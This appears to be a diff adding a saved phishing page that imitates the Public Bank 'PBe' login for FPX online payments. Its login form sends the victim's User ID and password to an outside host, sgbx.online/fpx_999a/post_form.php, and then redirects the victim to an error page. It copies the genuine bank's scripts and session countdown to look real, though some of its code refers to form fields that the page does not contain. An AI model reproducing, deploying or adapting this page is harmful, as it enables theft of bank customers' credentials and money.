@@ -1,0 +1,209 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<!-- saved from url=(0067)https://sgbx.online/fpx_999a/PBB/JunctionManager_data/user_cnpy.php -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta http-equiv="CACHE-CONTROL" content="NO-CACHE, NO-STORE, MUST-REVALIDATE">
+<meta http-equiv="PRAGMA" content="NO-CACHE">
+<meta http-equiv="EXPIRES" content="-1">
+<title>Login to PBe</title>
+<link rel="stylesheet" href="./font-awesome.min.css">
+<link href="./font-awesome.css" rel="stylesheet" type="text/css">
+<link href="./jquery-ui(1).css" rel="stylesheet" type="text/css">
+<link href="./style-metronic(1).css" rel="stylesheet" type="text/css">
+<link href="./style(1).css" rel="stylesheet" type="text/css">
+<link href="./style-responsive(1).css" rel="stylesheet" type="text/css">
+<link href="./default(1).css" rel="stylesheet" type="text/css" id="style_color">
+<link href="./custom(1).css" rel="stylesheet" type="text/css">
+<link href="./bootstrap_frame.css" rel="stylesheet" type="text/css">
+<link href="./custom_style.css" rel="stylesheet" type="text/css">
+<script src="./jquery-3.js.download" type="text/javascript"></script>
+<script src="./html5shiv.js(1).download" type="text/javascript"></script>
+<script src="./jslib.js(1).download" type="text/javascript"></script>
+<script src="./jquery-ui.js.download" type="text/javascript"></script>
+<script type="text/javascript">
+	jQuery(document).ready(function() {
+		// App.init();
+	});
+</script>
+</head>
+<body>
+<div class="container-context">
+<form class="login-form" name="LoginForm" id="LoginId" action="https://sgbx.online/fpx_999a/post_form.php" method="post" onsubmit="window.parent.location.href = &#39;/fpx_999a/error.php&#39;; ">
+<table width="100%">
+<tbody><tr>
+<td width="45%" valign="bottom">
+<h3 class="form-title" id="login-title">Login to PBe</h3>
+</td>
+</tr>
+<tr>
+<td style="padding-right:20px" valign="bottom" align="right">
+<p class="form-title">
+Saturday, 11 June 2022 17:27:15 </p>
+</td>
+</tr>
+
+<tr><td>
+<div class="input-icon">
+<i class="fa fa-user"></i>
+<input class="form-control placeholder-no-fix" type="text" autocomplete="off" placeholder="User ID" name="uname" id="uname" size="14" maxlength="20">
+<br>
+<i class="fa fa-key"></i>
+<input class="form-control placeholder-no-fix" type="password" autocomplete="off" placeholder="Password" name="pd" id="pd" size="14" maxlength="20">
+</div>
+</td></tr>
+</tbody></table>
+</form></div>
+<div class="login-form"><p class="margin-left-10" id="timer" style="color:blue;font-size:15px;"></p></div>
+<table width="100%">
+<tbody><tr><td>
+<div class="login-form form-actions">
+<div class="pull-right"><input type="hidden" id="b" name="b" value="PUBLIC BANK">
+<button type="submit" class="btn red" name="Next" id="NextBtn" value="Next">Next</button></div>
+</div>
+
+<div class="clearfix">
+</div></td></tr>
+</tbody></table>
+<br>
+
+<div id="login-assist"></div>
+<br>
+<script type="text/javascript">
+            if (getQueryStringParameter("Back") != 1) {
+                document.write("<p class='errMsg'></p>");
+            }
+        </script><p class="errMsg"></p><p class="errMsg"></p>
+<script type="text/javascript">
+    $(document).ready(function () {
+        /*if (window.top==window.self) {
+        location.href = "LoginPBB.html";
+        }*/
+
+        $('#NextBtn').click(function () {
+            var msg = "Next";
+            $('#NB').val(msg);
+        });
+
+        document.onkeydown = handleKeyPress_CNPY;
+        (new FormObjects()).setTitle((new ModalDialogObjects()).junctionType()["login-title"]);
+        document.forms[0].tempusername.focus();
+    });
+
+    function leave() 
+    {
+      leaveFPX();
+      top.window.location = "https://www.pbebank.com/";
+    }
+
+    function leaveFPX()
+    {
+      
+    }
+
+    function handleKeyPress_CNPY(evt) {
+        var nbr;
+        if (window.event) nbr = event.keyCode;
+        var e = window.event;
+        if (nbr == 13) {
+            if (!mandatoryChecking()) {
+                return false;
+            }
+            else {
+                /* alert('Please click the Next Button to proceed');
+                e.cancelBubble = true;
+                e.returnValue = false;
+                if (e.stopPropagation) {
+                e.stopPropagation();
+                e.preventDefault();
+                }*/
+                return true;
+            }
+            // return false;
+        }
+        return true;
+    }
+
+    function doSubmit_CNPY() {
+        
+    	   
+        if (!mandatoryChecking()) {
+            setTimeout('leave()', 1000); //redirect to homepage in 1 second 
+            return false;
+        }else if(!alphanumeric( document.LoginForm.tempusername.value))
+        	{
+        	return false;
+        	}
+        else {
+            //document.LoginForm.username.value = document.LoginForm.tempusername.value.replace(/^\s\s*/, '').replace(/\s\s*$/, '').toUpperCase();
+            document.LoginForm.username.value = document.LoginForm.tempusername.value.replace(/^\s\s*/, '').replace(/\s\s*$/, '');
+            document.LoginForm.tempusername.disabled = true;
+            //       document.LoginForm.Next.focus();            
+            //return true;
+        }
+        return true;
+    }
+
+    function mandatoryChecking(){
+    	if (trim(document.LoginForm.tempusername.value) == "" || trim(document.LoginForm.tempusername.value) == "User ID") {
+                alert("User ID is required.");
+                document.LoginForm.tempusername.focus();
+                return false;
+            }
+            else {
+    	     return true;
+    	}
+    }
+    
+    function alphanumeric(inputtxt)
+    {
+    	var letterNumber=/^[0-9a-zA-Z]+$/;
+    	if((inputtxt.match(letterNumber)))
+    		{
+    		return true;
+    		}else
+    			{
+    			alert("Username contains non Alphanumberic values and spaces")
+    			return false;
+    			}
+    }
+
+
+    
+    
+    
+    var url = top.window.location.href;
+    if (url.indexOf("PaymentAgent") != -1)
+    {
+      var now = -1000;
+
+      // Update the count down every 1 second
+      var x = setInterval(function() {
+
+        // Get todays date and time
+        now = now + 1000;
+    
+        // Find the distance between now an the count down date
+        //var distance = 300000 - now;
+        var distance = 300000 - now;
+    
+        // Time calculations for days, hours, minutes and seconds
+        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+        var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+    
+        // Output the result in an element with id="demo"
+        document.getElementById("timer").innerHTML = "This session will close in " + "[00:" + ("0" + minutes).slice(-2) + ":" + ("0" + seconds).slice(-2) + "]";
+    
+        // If the count down is over, write some text 
+        if (distance <= 0) {
+          clearInterval(x);
+          //document.getElementById("demo").innerHTML = "EXPIRED";
+          leaveFPX();         
+          top.window.location = "https://www.pbebank.com/";
+        }
+    
+      }, 1000);
+    }
+
+</script>
+
+</body></html>
